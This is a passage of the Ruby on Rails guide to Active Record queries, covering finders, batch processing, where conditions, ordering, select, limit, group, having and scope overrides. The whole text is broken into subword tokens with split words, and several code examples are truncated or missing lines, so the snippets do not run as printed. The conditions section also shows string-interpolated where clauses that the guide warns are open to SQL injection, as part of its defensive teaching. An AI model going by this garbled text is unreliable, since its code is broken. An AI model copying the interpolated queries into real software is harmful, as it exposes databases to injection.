▁* ▁` order `
▁* ▁` p reload `
▁* ▁` readonly `
▁* ▁` reference s `
▁* ▁` re order `
▁* ▁` reverse _ order `
▁* ▁` select `
▁* ▁` un i q `
▁* ▁` where `
▁All ▁of ▁the ▁above ▁methods ▁return ▁an ▁instance ▁of ▁` ActiveRecord :: Relation `.
▁The ▁primary ▁operation ▁of ▁` Model . find ( options )` ▁can ▁be ▁summariz ed ▁as :
▁* ▁Convert ▁the ▁supplied ▁options ▁to ▁an ▁equivalent ▁SQL ▁query .
▁* ▁F i re ▁the ▁SQL ▁query ▁and ▁retrieve ▁the ▁corresponding ▁results ▁from ▁the ▁database .
▁* ▁In st ant i ate ▁the ▁equivalent ▁Ruby ▁object ▁of ▁the ▁appropriate ▁model ▁for ▁every ▁result ing ▁row .
▁### ▁R etriev ing ▁a ▁S ing le ▁Object
▁Active ▁Record ▁provides ▁sever al ▁different ▁ways ▁of ▁retriev ing ▁a ▁single ▁object .
▁#### ▁` find `
▁Using ▁the ▁` find ` ▁method , ▁you ▁can ▁retrieve ▁the ▁object ▁corresponding ▁to ▁the ▁specified ▁ _ primary ▁key _ ▁that ▁matches ▁any ▁supplied ▁options .
▁For ▁example :
▁# ▁Find ▁the ▁client ▁with ▁primary ▁key ▁( id ) ▁10 .
▁client ▁= ▁Client . find (10)
▁# ▁=> ▁#< Client ▁id : ▁10 , ▁first _ name : ▁" Ryan ">
▁The ▁SQL ▁equivalent ▁of ▁the ▁above ▁is :
▁ SELECT ▁* ▁FROM ▁clients ▁WHERE ▁( client s . id ▁= ▁10 ) ▁LIMIT ▁1
▁The ▁` find ` ▁method ▁will ▁raise ▁an ▁` ActiveRecord :: RecordNotFound ` ▁exception ▁if ▁no ▁matching ▁record ▁is ▁found .
▁You ▁can ▁also ▁use ▁this ▁method ▁to ▁query ▁for ▁multiple ▁objects .
▁Call ▁the ▁` find ` ▁method ▁and ▁pass ▁in ▁an ▁array ▁of ▁primary ▁keys .
▁The ▁return ▁will ▁be ▁an ▁array ▁containing ▁all ▁of ▁the ▁matching ▁records ▁for ▁the ▁supplied ▁ _ primary ▁keys _ .
▁# ▁Find ▁the ▁clients ▁with ▁primary ▁keys ▁1 ▁and ▁10 .
▁client ▁= ▁Client . find ( [ 1, ▁10 ]) ▁# ▁Or ▁even ▁Client . find ( 1, ▁10 )
▁# ▁=> ▁[ # < Client ▁id : ▁1, ▁first _ name : ▁" Lifo "> , ▁#< Client ▁id : ▁10 , ▁first _ name : ▁" Ryan "> ]
▁ SELECT ▁* ▁FROM ▁clients ▁WHERE ▁( client s . id ▁ IN ▁( 1, 10 ) )
▁WARNING : ▁The ▁` find ` ▁method ▁will ▁raise ▁an ▁` ActiveRecord :: RecordNotFound ` ▁exception ▁unless ▁a ▁matching ▁record ▁is ▁found ▁for ▁** all ** ▁of ▁the ▁supplied ▁primary ▁keys .
▁#### ▁` take `
▁The ▁` take ` ▁method ▁retrieve s ▁a ▁record ▁without ▁any ▁ implicit ▁order ing .
▁client ▁= ▁Client . take
▁# ▁=> ▁#< Client ▁id : ▁1, ▁first _ name : ▁" Lifo ">
▁ SELECT ▁* ▁FROM ▁clients ▁LIMIT ▁1
▁The ▁` take ` ▁method ▁returns ▁` nil ` ▁if ▁no ▁record ▁is ▁found ▁and ▁no ▁exception ▁will ▁be ▁raised .
▁You ▁can ▁pass ▁in ▁a ▁ n umeric al ▁argument ▁to ▁the ▁` take ` ▁method ▁to ▁return ▁up ▁to ▁that ▁number ▁of ▁results .
▁For ▁example
▁client ▁= ▁Client . take (2)
▁# ▁=> ▁[
▁#< Client ▁id : ▁1, ▁first _ name : ▁" Lifo "> ,
▁#< Client ▁id : ▁2 20 , ▁first _ name : ▁" S ar a ">
▁ SELECT ▁* ▁FROM ▁clients ▁LIMIT ▁2
▁TIP : ▁The ▁retrieved ▁record ▁may ▁var y ▁depending ▁on ▁the ▁database ▁engine .
▁#### ▁` first `
▁The ▁` first ` ▁method ▁find s ▁the ▁first ▁record ▁order ed ▁by ▁the ▁primary ▁key .
▁client ▁= ▁Client . first
▁ SELECT ▁* ▁FROM ▁clients ▁OR DER ▁BY ▁clients . id ▁A S C ▁LIMIT ▁1
▁The ▁` first ` ▁method ▁returns ▁` nil ` ▁if ▁no ▁matching ▁record ▁is ▁found ▁and ▁no ▁exception ▁will ▁be ▁raised .
▁You ▁can ▁pass ▁in ▁a ▁ n umeric al ▁argument ▁to ▁the ▁` first ` ▁method ▁to ▁return ▁up ▁to ▁that ▁number ▁of ▁results .
▁For ▁example
▁client ▁= ▁Client . first (3)
▁#< Client ▁id : ▁2, ▁first _ name : ▁" F if o "> ,
▁#< Client ▁id : ▁3 , ▁first _ name : ▁" F i lo ">
▁ SELECT ▁* ▁FROM ▁clients ▁OR DER ▁BY ▁clients . id ▁A S C ▁LIMIT ▁3
▁The ▁` first !` ▁method ▁be ha ve s ▁exactly ▁like ▁` first `, ▁except ▁that ▁it ▁will ▁raise ▁` ActiveRecord :: RecordNotFound ` ▁if ▁no ▁matching ▁record ▁is ▁found .
▁#### ▁` last `
▁The ▁` last ` ▁method ▁find s ▁the ▁last ▁record ▁order ed ▁by ▁the ▁primary ▁key .
▁client ▁= ▁Client . last
▁# ▁=> ▁#< Client ▁id : ▁ 22 1, ▁first _ name : ▁" R us s el ">
▁ SELECT ▁* ▁FROM ▁clients ▁OR DER ▁BY ▁clients . id ▁DESC ▁LIMIT ▁1
▁The ▁` last ` ▁method ▁returns ▁` nil ` ▁if ▁no ▁matching ▁record ▁is ▁found ▁and ▁no ▁exception ▁will ▁be ▁raised .
▁You ▁can ▁pass ▁in ▁a ▁ n umeric al ▁argument ▁to ▁the ▁` last ` ▁method ▁to ▁return ▁up ▁to ▁that ▁number ▁of ▁results .
▁client ▁= ▁Client . last (3)
▁#< Client ▁id : ▁2 19 , ▁first _ name : ▁" J am es "> ,
▁#< Client ▁id : ▁2 20 , ▁first _ name : ▁" S ar a "> ,
▁#< Client ▁id : ▁ 22 1, ▁first _ name : ▁" R us s el ">
▁ SELECT ▁* ▁FROM ▁clients ▁OR DER ▁BY ▁clients . id ▁DESC ▁LIMIT ▁3
▁The ▁` last !` ▁method ▁be ha ve s ▁exactly ▁like ▁` last `, ▁except ▁that ▁it ▁will ▁raise ▁` ActiveRecord :: RecordNotFound ` ▁if ▁no ▁matching ▁record ▁is ▁found .
▁#### ▁` find _ by `
▁The ▁` find _ by ` ▁method ▁find s ▁the ▁first ▁record ▁matching ▁some ▁conditions .
▁Client . find _ by ▁first _ name : ▁' Lifo '
▁Client . find _ by ▁first _ name : ▁' J on '
▁# ▁=> ▁nil
▁It ▁is ▁equivalent ▁to ▁writing :
▁Client . where ( first _ name : ▁' Lifo ' ). take
▁The ▁` find _ by !` ▁method ▁be ha ve s ▁exactly ▁like ▁` find _ by `, ▁except ▁that ▁it ▁will ▁raise ▁` ActiveRecord :: RecordNotFound ` ▁if ▁no ▁matching ▁record ▁is ▁found .
▁Client . find _ by !
▁first _ name : ▁' do es ▁not ▁exist '
▁# ▁=> ▁ActiveRecord :: RecordNotFound
▁This ▁is ▁equivalent ▁to ▁writing :
▁Client . where ( first _ name : ▁' do es ▁not ▁exist ' ). take !
▁### ▁R etriev ing ▁Multi p le ▁Object s ▁in ▁B at ch es
▁We ▁often ▁need ▁to ▁iterate ▁over ▁a ▁large ▁set ▁of ▁records , ▁as ▁when ▁we ▁send ▁a ▁new s let ter ▁to ▁a ▁large ▁set ▁of ▁users , ▁or ▁when ▁we ▁ ex port ▁data .
▁This ▁may ▁appear ▁straightforward :
▁# ▁This ▁is ▁very ▁in efficient ▁when ▁the ▁users ▁table ▁has ▁ th ous and s ▁of ▁row s .
▁User . all . each ▁do ▁| user |
▁ New s Mailer . week ly ( user ). deliver _ now
▁But ▁this ▁approach ▁becomes ▁increasing ly ▁i mp r ac t ical ▁as ▁the ▁table ▁size ▁increase s , ▁since ▁` User . all . each ` ▁instruct s ▁Active ▁Record ▁to ▁fetch ▁ _ the ▁entire ▁table _ ▁in ▁a ▁single ▁pass , ▁build ▁a ▁model ▁object ▁per ▁row , ▁and ▁the n ▁keep ▁the ▁entire ▁array ▁of ▁model ▁objects ▁in ▁memory .
▁Inde ed , ▁if ▁we ▁have ▁a ▁large ▁number ▁of ▁records , ▁the ▁entire ▁collection ▁may ▁ ex ce ed ▁the ▁amount ▁of ▁memory ▁available .
▁Rails ▁provides ▁two ▁methods ▁that ▁address ▁this ▁problem ▁by ▁ div id ing ▁records ▁into ▁memory - friendly ▁ batches ▁for ▁process ing .
▁The ▁first ▁method , ▁` find _ each `, ▁retrieve s ▁a ▁b at ch ▁of ▁records ▁and ▁the n ▁yields ▁ _ each _ ▁record ▁to ▁the ▁block ▁individual ly ▁as ▁a ▁model .
▁The ▁second ▁method , ▁` find _ in _ batches `, ▁retrieve s ▁a ▁b at ch ▁of ▁records ▁and ▁the n ▁yields ▁ _ the ▁entire ▁b at ch _ ▁to ▁the ▁block ▁as ▁an ▁array ▁of ▁models .
▁TIP : ▁The ▁` find _ each ` ▁and ▁` find _ in _ batches ` ▁methods ▁are ▁intend ed ▁for ▁use ▁in ▁the ▁b at ch ▁process ing ▁of ▁a ▁large ▁number ▁of ▁records ▁that ▁would n ' t ▁fit ▁in ▁memory ▁all ▁at ▁once .
▁If ▁you ▁just ▁need ▁to ▁loop ▁over ▁a ▁ th ous and ▁records ▁the ▁regular ▁find ▁methods ▁are ▁the ▁preferred ▁option .
▁#### ▁` find _ each `
▁The ▁` find _ each ` ▁method ▁retrieve s ▁a ▁b at ch ▁of ▁records ▁and ▁the n ▁yields ▁ _ each _ ▁record ▁to ▁the ▁block ▁individual ly ▁as ▁a ▁model .
▁In ▁the ▁following ▁example , ▁` find _ each ` ▁will ▁retrieve ▁100 0 ▁records ▁( the ▁current ▁default ▁for ▁both ▁` find _ each ` ▁and ▁` find _ in _ batches `) ▁and ▁the n ▁yield ▁each ▁record ▁individual ly ▁to ▁the ▁block ▁as ▁a ▁model .
▁This ▁process ▁is ▁repeated ▁un til ▁all ▁of ▁the ▁records ▁have ▁been ▁processed :
▁User . find _ each ▁do ▁| user |
▁To ▁add ▁conditions ▁to ▁a ▁` find _ each ` ▁operation ▁you ▁can ▁chain ▁other ▁Active ▁Record ▁methods ▁such ▁as ▁` where ` :
▁User . where ( week ly _ sub sc r i b er : ▁true ). find _ each ▁do ▁| user |
▁#### # ▁ Options ▁for ▁` find _ each `
▁The ▁` find _ each ` ▁method ▁accept s ▁most ▁of ▁the ▁options ▁allowed ▁by ▁the ▁regular ▁` find ` ▁method , ▁except ▁for ▁`: order ` ▁and ▁`: limit `, ▁which ▁are ▁reserved ▁for ▁internal ▁use ▁by ▁` find _ each `.
▁**` : b at ch _ size ` **
▁The ▁`: b at ch _ size ` ▁option ▁allows ▁you ▁to ▁specify ▁the ▁number ▁of ▁records ▁to ▁be ▁retrieved ▁in ▁each ▁b at ch , ▁before ▁being ▁passed ▁individual ly ▁to ▁the ▁block .
▁For ▁example , ▁to ▁retrieve ▁records ▁in ▁ batches ▁of ▁5 000 :
▁User . find _ each ( b at ch _ size : ▁5 000 ) ▁do ▁| user |
▁By ▁default , ▁records ▁are ▁fetch ed ▁in ▁as c end ing ▁order ▁of ▁the ▁primary ▁key , ▁which ▁must ▁be ▁an ▁integer .
▁This ▁would ▁be ▁useful , ▁for ▁example , ▁if ▁you ▁want ed ▁to ▁re sum e ▁an ▁in ter r up t ed ▁b at ch ▁process , ▁provided ▁you ▁saved ▁the ▁last ▁processed ▁ ID ▁as ▁a ▁check point .
▁For ▁example , ▁to ▁send ▁new s let ter s ▁only ▁to ▁users ▁with ▁the ▁primary ▁key ▁starting ▁from ▁2000 , ▁and ▁to ▁retrieve ▁them ▁in ▁ batches ▁of ▁5 000 :
▁#### ▁` find _ in _ batches `
▁The ▁` find _ in _ batches ` ▁method ▁is ▁similar ▁to ▁` find _ each `, ▁since ▁both ▁retrieve ▁ batches ▁of ▁records .
▁The ▁difference ▁is ▁that ▁` find _ in _ batches ` ▁yields ▁ _ batches _ ▁to ▁the ▁block ▁as ▁an ▁array ▁of ▁models , ▁instead ▁of ▁individual ly .
▁The ▁following ▁example ▁will ▁yield ▁to ▁the ▁supplied ▁block ▁an ▁array ▁of ▁up ▁to ▁100 0 ▁ invoice s ▁at ▁a ▁time , ▁with ▁the ▁final ▁block ▁containing ▁any ▁remain ing ▁ invoice s :
▁# ▁G ive ▁add _ invoice s ▁an ▁array ▁of ▁100 0 ▁ invoice s ▁at ▁a ▁time
▁ Invoice . find _ in _ batches ▁do ▁| invoice s |
▁ ex port . add _ invoice s ( invoice s )
▁#### # ▁ Options ▁for ▁` find _ in _ batches `
▁options
▁Conditions
▁- ---------
▁The ▁` where ` ▁method ▁allows ▁you ▁to ▁specify ▁conditions ▁to ▁limit ▁the ▁records ▁returned , ▁represent ing ▁the ▁` W H ER E ` - part ▁of ▁the ▁SQL ▁statement .
▁Conditions ▁can ▁either ▁be ▁specified ▁as ▁a ▁string , ▁array , ▁or ▁hash .
▁### ▁P ure ▁ String ▁Conditions
▁If ▁you ' d ▁like ▁to ▁add ▁conditions ▁to ▁your ▁find , ▁you ▁could ▁just ▁specify ▁them ▁in ▁there , ▁just ▁like ▁` Client . where (" orders _ count ▁= ▁' 2 ' ") `.
▁This ▁will ▁find ▁all ▁clients ▁where ▁the ▁` orders _ count ` ▁field ' s ▁value ▁is ▁2 .
▁WARNING : ▁B u il d ing ▁your ▁own ▁conditions ▁as ▁pure ▁strings ▁can ▁leave ▁you ▁vulnerable ▁to ▁SQL ▁injection ▁ exploit s .
▁For ▁example , ▁` Client . where (" first _ name ▁L I K E ▁' % # { params [: first _ name ]} % ' ") ` ▁is ▁not ▁safe .
▁See ▁the ▁next ▁section ▁for ▁the ▁preferred ▁way ▁to ▁handle ▁conditions ▁using ▁an ▁array .
▁### ▁ Array ▁Conditions
▁Now ▁what ▁if ▁that ▁number ▁could ▁var y , ▁say ▁as ▁an ▁argument ▁from ▁some where ?
▁The ▁find ▁would ▁the n ▁take ▁the ▁form :
▁Client . where (" orders _ count ▁= ▁ ? ", ▁params [: orders ])
▁Active ▁Record ▁will ▁go ▁through ▁the ▁first ▁element ▁in ▁the ▁conditions ▁value ▁and ▁any ▁ additional ▁elements ▁will ▁replace ▁the ▁question ▁mark s ▁` ( ? )` ▁in ▁the ▁first ▁element .
▁If ▁you ▁want ▁to ▁specify ▁multiple ▁conditions :
▁ AND ▁ lock ed ▁= ▁ ? ", ▁params [: orders ] , ▁false )
▁In ▁this ▁example , ▁the ▁first ▁question ▁mark ▁will ▁be ▁replaced ▁with ▁the ▁value ▁in ▁` params [: orders ]` ▁and ▁the ▁second ▁will ▁be ▁replaced ▁with ▁the ▁SQL ▁representation ▁of ▁` false `, ▁which ▁depend s ▁on ▁the ▁adapter .
▁This ▁code ▁is ▁high ly ▁prefer able :
▁to ▁this ▁code :
▁Client . where (" orders _ count ▁= ▁# { params [: orders ]} ")
▁P utting ▁the ▁variable ▁directly ▁into ▁the ▁conditions ▁string ▁will ▁pass ▁the ▁variable ▁to ▁the ▁database ▁** as - is ** .
▁This ▁means ▁that ▁it ▁will ▁be ▁an ▁un escape d ▁variable ▁directly ▁from ▁a ▁user ▁who ▁may ▁have ▁ malicious ▁in t ent .
▁If ▁you ▁do ▁this , ▁you ▁put ▁your ▁entire ▁database ▁at ▁risk ▁because ▁once ▁a ▁user ▁find s ▁out ▁they ▁can ▁ exploit ▁your ▁database ▁they ▁can ▁do ▁just ▁about ▁anything ▁to ▁it .
▁N ever ▁ever ▁put ▁your ▁arguments ▁directly ▁inside ▁the ▁conditions ▁string .
▁TIP : ▁For ▁more ▁information ▁on ▁the ▁ danger s ▁of ▁SQL ▁injection , ▁see ▁the ▁[ Ruby ▁on ▁Rails ▁ Security ▁G u id e ]( security . html # sql - in j ection ).
▁#### ▁P la ce h ol d er ▁Conditions
▁Similar ▁to ▁the ▁` ( ? )` ▁replace ment ▁style ▁of ▁params , ▁you ▁can ▁also ▁specify ▁keys / value s ▁hash ▁in ▁your ▁array ▁conditions :
▁Client . where (" created _ at ▁ > = ▁: start _ date ▁ AND ▁created _ at ▁< = ▁: end _ date ",
▁ { start _ date : ▁params [: start _ date ] , ▁end _ date : ▁params [: end _ date ]} )
▁This ▁make s ▁for ▁clear er ▁read ability ▁if ▁you ▁have ▁a ▁large ▁number ▁of ▁variable ▁conditions .
▁### ▁ Hash ▁Conditions
▁Active ▁Record ▁also ▁allows ▁you ▁to ▁pass ▁in ▁hash ▁conditions ▁which ▁can ▁increase ▁the ▁read ability ▁of ▁your ▁conditions ▁syntax .
▁With ▁hash ▁conditions , ▁you ▁pass ▁in ▁a ▁hash ▁with ▁keys ▁of ▁the ▁fields ▁you ▁want ▁condition al is ed ▁and ▁the ▁values ▁of ▁how ▁you ▁want ▁to ▁condition al is e ▁them :
▁NOTE : ▁On ly ▁equal ity , ▁range ▁and ▁sub set ▁check ing ▁are ▁possible ▁with ▁ Hash ▁conditions .
▁#### ▁E quality ▁Conditions
▁Client . where ( lock ed : ▁true )
▁The ▁field ▁name ▁can ▁also ▁be ▁a ▁string :
▁Client . where (' lock ed ' ▁=> ▁true )
▁In ▁the ▁case ▁of ▁a ▁belongs _ to ▁relationship , ▁an ▁association ▁key ▁can ▁be ▁used ▁to ▁specify ▁the ▁model ▁if ▁an ▁Active ▁Record ▁object ▁is ▁used ▁as ▁the ▁value .
▁This ▁method ▁works ▁with ▁ polymorphic ▁relationships ▁as ▁well .
▁Article . where ( author : ▁author )
▁ Auth or . joins (: articles ). where ( articles : ▁ { ▁author : ▁author ▁ })
▁NOTE : ▁The ▁values ▁cannot ▁be ▁symbols .
▁For ▁example , ▁you ▁cannot ▁do ▁` Client . where ( status : ▁: active ) `.
▁#### ▁ Range ▁Conditions
▁Client . where ( created _ at : ▁( Time . now . midnight ▁- ▁1. day ). .
▁This ▁will ▁find ▁all ▁clients ▁created ▁ yesterday ▁by ▁using ▁a ▁` BETWEEN ` ▁SQL ▁statement :
▁ SELECT ▁* ▁FROM ▁clients ▁WHERE ▁( client s . created _ at ▁ BETWEEN ▁' 200 8 - 12 - 2 1 ▁00:00:00 ' ▁ AND ▁' 200 8 - 12 - 22 ▁00:00:00 ')
▁This ▁demonstrate s ▁a ▁short er ▁syntax ▁for ▁the ▁examples ▁in ▁[ Array ▁Conditions ](# array - condition s )
▁#### ▁S u b set ▁Conditions
▁If ▁you ▁want ▁to ▁find ▁records ▁using ▁the ▁` IN ` ▁expression ▁you ▁can ▁pass ▁an ▁array ▁to ▁the ▁conditions ▁hash :
▁Client . where ( orders _ count : ▁[1, 3 , 5 ])
▁This ▁code ▁will ▁generate ▁SQL ▁like ▁this :
▁ SELECT ▁* ▁FROM ▁clients ▁WHERE ▁( client s . orders _ count ▁ IN ▁( 1, 3 , 5 ) )
▁### ▁ NOT ▁Conditions
▁` NOT ` ▁SQL ▁queries ▁can ▁be ▁built ▁by ▁` where . not `.
▁Article . where . not ( author : ▁author )
▁In ▁other ▁words , ▁this ▁query ▁can ▁be ▁generated ▁by ▁calling ▁` where ` ▁with ▁no ▁argument , ▁the n ▁immediately ▁chain ▁with ▁` not ` ▁passing ▁` where ` ▁conditions .
▁ Order ing
▁To ▁retrieve ▁records ▁from ▁the ▁database ▁in ▁a ▁specific ▁order , ▁you ▁can ▁use ▁the ▁` order ` ▁method .
▁For ▁example , ▁if ▁you ' re ▁getting ▁a ▁set ▁of ▁records ▁and ▁want ▁to ▁order ▁them ▁in ▁as c end ing ▁order ▁by ▁the ▁` created _ at ` ▁field ▁in ▁your ▁table :
▁Client . order (: created _ at )
▁Client . order (" created _ at ")
▁You ▁could ▁specify ▁` A S C ` ▁or ▁` D E S C ` ▁as ▁well :
▁Client . order ( created _ at : ▁: de sc )
▁Client . order ( created _ at : ▁: as c )
▁Client . order (" created _ at ▁DESC ")
▁Client . order (" created _ at ▁A S C ")
▁Or ▁order ing ▁by ▁multiple ▁fields :
▁Client . order ( orders _ count : ▁: as c , ▁created _ at : ▁: de sc )
▁Client . order (: orders _ count , ▁created _ at : ▁: de sc )
▁Client . order (" orders _ count ▁A S C , ▁created _ at ▁DESC ")
▁Client . order (" orders _ count ▁A S C ", ▁" created _ at ▁DESC ")
▁Client . order (" orders _ count ▁A S C ") . order (" created _ at ▁DESC ")
▁# ▁ SELECT ▁* ▁FROM ▁clients ▁OR DER ▁BY ▁orders _ count ▁A S C , ▁created _ at ▁DESC
▁S el ec ting ▁ Specific ▁F i el d s
▁By ▁default , ▁` Model . find ` ▁select s ▁all ▁the ▁fields ▁from ▁the ▁result ▁set ▁using ▁` select ▁* `.
▁To ▁select ▁only ▁a ▁sub set ▁of ▁fields ▁from ▁the ▁result ▁set , ▁you ▁can ▁specify ▁the ▁sub set ▁via ▁the ▁` select ` ▁method .
▁For ▁example , ▁to ▁select ▁only ▁` view able _ by ` ▁and ▁` lock ed ` ▁columns :
▁Client . select (" view able _ by , ▁ lock ed ")
▁The ▁SQL ▁query ▁used ▁by ▁this ▁find ▁call ▁will ▁be ▁some what ▁like :
▁ SELECT ▁view able _ by , ▁ lock ed ▁FROM ▁clients
▁Be ▁careful ▁because ▁this ▁also ▁means ▁you ' re ▁initializ ing ▁a ▁model ▁object ▁with ▁only ▁the ▁fields ▁that ▁you ' ve ▁select ed .
▁If ▁you ▁attempt ▁to ▁access ▁a ▁field ▁that ▁is ▁not ▁in ▁the ▁initialize d ▁record ▁you ' ll ▁receive :
▁`` ` b as h
▁W h er e ▁` < attribute >` ▁is ▁the ▁attribute ▁you ▁as k ed ▁for .
▁The ▁` id ` ▁method ▁will ▁not ▁raise ▁the ▁` ActiveRecord :: Missing A tt r i but e Error `, ▁so ▁just ▁be ▁careful ▁when ▁working ▁with ▁associations ▁because ▁they ▁need ▁the ▁` id ` ▁method ▁to ▁function ▁properly .
▁If ▁you ▁would ▁like ▁to ▁only ▁gra b ▁a ▁single ▁record ▁per ▁unique ▁value ▁in ▁a ▁certain ▁field , ▁you ▁can ▁use ▁` distinct ` :
▁Client . select (: name ). distinct
▁This ▁would ▁generate ▁SQL ▁like :
▁ SELECT ▁D I ST IN C T ▁name ▁FROM ▁clients
▁You ▁can ▁also ▁remove ▁the ▁uniqueness ▁constraint :
▁query ▁= ▁Client . select (: name ). distinct
▁# ▁=> ▁Return s ▁unique ▁names
▁query . distinct ( false )
▁# ▁=> ▁Return s ▁all ▁names , ▁even ▁if ▁there ▁are ▁duplicate s
▁L i m it ▁and ▁Of f set
▁To ▁apply ▁` L I M I T ` ▁to ▁the ▁SQL ▁fire d ▁by ▁the ▁` Model . find `, ▁you ▁can ▁specify ▁the ▁` L I M I T ` ▁using ▁` limit ` ▁and ▁` offset ` ▁methods ▁on ▁the ▁relation .
▁You ▁can ▁use ▁` limit ` ▁to ▁specify ▁the ▁number ▁of ▁records ▁to ▁be ▁retrieved , ▁and ▁use ▁` offset ` ▁to ▁specify ▁the ▁number ▁of ▁records ▁to ▁skip ▁before ▁starting ▁to ▁return ▁the ▁records .
▁Client . limit ( 5 )
▁will ▁return ▁a ▁ maximum ▁of ▁5 ▁clients ▁and ▁because ▁it ▁specifie s ▁no ▁ offset ▁it ▁will ▁return ▁the ▁first ▁5 ▁in ▁the ▁table .
▁The ▁SQL ▁it ▁execute s ▁look s ▁like ▁this :
▁ SELECT ▁* ▁FROM ▁clients ▁LIMIT ▁5
▁ Adding ▁` offset ` ▁to ▁that
▁Client . limit ( 5 ). offset ( 3 0 )
▁will ▁return ▁instead ▁a ▁ maximum ▁of ▁5 ▁clients ▁beginning ▁with ▁the ▁31 st .
▁The ▁SQL ▁look s ▁like :
▁ SELECT ▁* ▁FROM ▁clients ▁LIMIT ▁5 ▁O F F S E T ▁30
▁G r o up
▁-- ---
▁To ▁apply ▁a ▁` G R O U P ▁BY ` ▁clause ▁to ▁the ▁SQL ▁fire d ▁by ▁the ▁finder , ▁you ▁can ▁specify ▁the ▁` group ` ▁method ▁on ▁the ▁find .
▁For ▁example , ▁if ▁you ▁want ▁to ▁find ▁a ▁collection ▁of ▁the ▁date s ▁orders ▁were ▁created ▁on :
▁ Order . select (" date ( created _ at ) ▁as ▁order ed _ date , ▁ sum ( price ) ▁as ▁total _ price ") . group (" date ( created _ at ) ")
▁And ▁this ▁will ▁give ▁you ▁a ▁single ▁` Order ` ▁object ▁for ▁each ▁date ▁where ▁there ▁are ▁orders ▁in ▁the ▁database .
▁The ▁SQL ▁that ▁would ▁be ▁executed ▁would ▁be ▁something ▁like ▁this :
▁ SELECT ▁date ( created _ at ) ▁as ▁order ed _ date , ▁ sum ( price ) ▁as ▁total _ price
▁FROM ▁orders
▁G R O U P ▁BY ▁date ( created _ at )
▁### ▁To t al ▁of ▁group ed ▁items
▁To ▁get ▁the ▁total ▁of ▁group ed ▁items ▁on ▁a ▁single ▁query ▁call ▁` count ` ▁after ▁the ▁` group `.
▁ Order . group (: status ). count
▁# ▁=> ▁ { ▁' a w a it ing _ app r o v al ' ▁=> ▁7 , ▁' p a id ' ▁=> ▁ 12 ▁ }
▁ SELECT ▁C O U N T ▁( * ) ▁A S ▁count _ all , ▁status ▁A S ▁status
▁FROM ▁" orders "
▁G R O U P ▁BY ▁status
▁Having
▁ ------
▁SQL ▁uses ▁the ▁` H A V ING ` ▁clause ▁to ▁specify ▁conditions ▁on ▁the ▁` G R O U P ▁BY ` ▁fields .
▁ Order . select (" date ( created _ at ) ▁as ▁order ed _ date , ▁ sum ( price ) ▁as ▁total _ price ") .
▁group (" date ( created _ at ) ") . having (" sum ( price ) ▁ > ▁ ? ", ▁100 )
▁H A V ING ▁ sum ( price ) ▁ > ▁100
▁This ▁will ▁return ▁single ▁order ▁objects ▁for ▁each ▁day , ▁but ▁only ▁those ▁that ▁are ▁order ed ▁more ▁than ▁ $ 1 00 ▁in ▁a ▁day .
▁ Overriding ▁Conditions
▁### ▁` unscope `
▁You ▁can ▁specify ▁certain ▁conditions ▁to ▁be ▁removed ▁using ▁the ▁` unscope ` ▁method .
▁Article . where (' id ▁ > ▁10 ' ). limit ( 20 ). order (' id ▁as c ' ). unscope (: order )
▁The ▁SQL ▁that ▁would ▁be ▁executed :
▁ SELECT ▁* ▁FROM ▁articles ▁WHERE ▁id ▁ > ▁10 ▁LIMIT ▁20
▁# ▁Or ig in al ▁query ▁without ▁` unscope `
▁ SELECT ▁* ▁FROM ▁articles ▁WHERE ▁id ▁ > ▁10 ▁OR DER ▁BY ▁id ▁as c ▁LIMIT ▁20
▁You ▁can ▁also ▁ unscope ▁specific ▁` where ` ▁clause s .
▁Article . where ( id : ▁10 , ▁ trashed : ▁false ). unscope ( where : ▁: id )
▁# ▁ SELECT ▁" articles ".
▁* ▁FROM ▁" articles " ▁WHERE ▁ trashed ▁= ▁0
▁A ▁relation ▁which ▁has ▁used ▁` unscope ` ▁will ▁a ffect ▁any ▁relation ▁it ▁is < n > merge d ▁in ▁to :
▁Article . order (' id ▁as c ' ). merge ( Article . unscope (: order ) )
▁* ▁FROM ▁" articles "
▁### ▁` only `
▁You ▁can ▁also ▁override ▁conditions ▁using ▁the ▁` only ` ▁method .
▁Article . where (' id ▁ > ▁10 ' ). limit ( 20 ). order (' id ▁ de sc ' ). only (: order , ▁: where )
▁ SELECT ▁* ▁FROM ▁articles ▁WHERE ▁id ▁ > ▁10 ▁OR DER ▁BY ▁id ▁DESC
▁# ▁Or ig in al ▁query ▁without ▁` only `
▁ SELECT ▁" articles ".
▁* ▁FROM ▁" articles " ▁WHERE ▁( id ▁ > ▁10 ) ▁OR DER ▁BY ▁id ▁ de sc ▁LIMIT ▁20
▁### ▁` re order `
▁The ▁` re order ` ▁method ▁override s ▁the ▁default ▁scope ▁order .
▁class ▁Article ▁< ▁ActiveRecord :: Base
▁has _ many ▁: comments , ▁-> ▁ { ▁order (' post ed _ at ▁DESC ') ▁ }
▁Article . find (10) . comments . re order (' name ')
▁ SELECT ▁* ▁FROM ▁articles ▁WHERE ▁id ▁= ▁10
▁ SELECT ▁* ▁FROM ▁comments ▁WHERE ▁article _ id ▁= ▁10 ▁OR DER ▁BY ▁name
▁In ▁case ▁the ▁` re order ` ▁clause ▁is ▁not ▁used , ▁the ▁SQL ▁executed ▁would ▁be :
▁ SELECT ▁* ▁FROM ▁comments ▁WHERE ▁article _ id ▁= ▁10 ▁OR DER ▁BY ▁post ed _ at ▁DESC
▁### ▁` reverse _ order `
▁The ▁` reverse _ order ` ▁method ▁reverse s ▁the ▁order ing ▁clause ▁if ▁specified .
▁Client . where (" orders _ count ▁ > ▁10 ") . order (: name ). reverse _ order
▁ SELECT ▁* ▁FROM ▁clients ▁WHERE ▁orders _ count ▁ > ▁10 ▁OR DER ▁BY ▁name ▁DESC
▁If ▁no ▁order ing ▁clause ▁is ▁specified ▁in ▁the ▁query , ▁the ▁` reverse _ order ` ▁orders ▁by ▁the ▁primary ▁key ▁in ▁reverse ▁order .
▁Client . where (" orders _ count ▁ > ▁10 ") . reverse _ order
▁This ▁method ▁accept s ▁** no ** ▁arguments .
▁### ▁` re where `
▁The ▁` re where ` ▁method ▁override s ▁an ▁existing , ▁named ▁where ▁condition .
▁Article . where ( trashed : ▁true ). re where ( trashed : ▁false )
▁ SELECT ▁* ▁FROM ▁articles ▁WHERE ▁` trashed ` ▁= ▁0
▁In ▁case ▁the ▁` re where ` ▁clause ▁is ▁not ▁used ,
▁Article . where ( trashed : ▁true ). where ( trashed : ▁false )
▁the ▁SQL ▁executed ▁would ▁be :
▁ SELECT ▁* ▁FROM ▁articles ▁WHERE ▁` trashed ` ▁= ▁1 ▁ AND ▁` trashed ` ▁= ▁0
▁N u ll ▁ Relation
▁ -------------
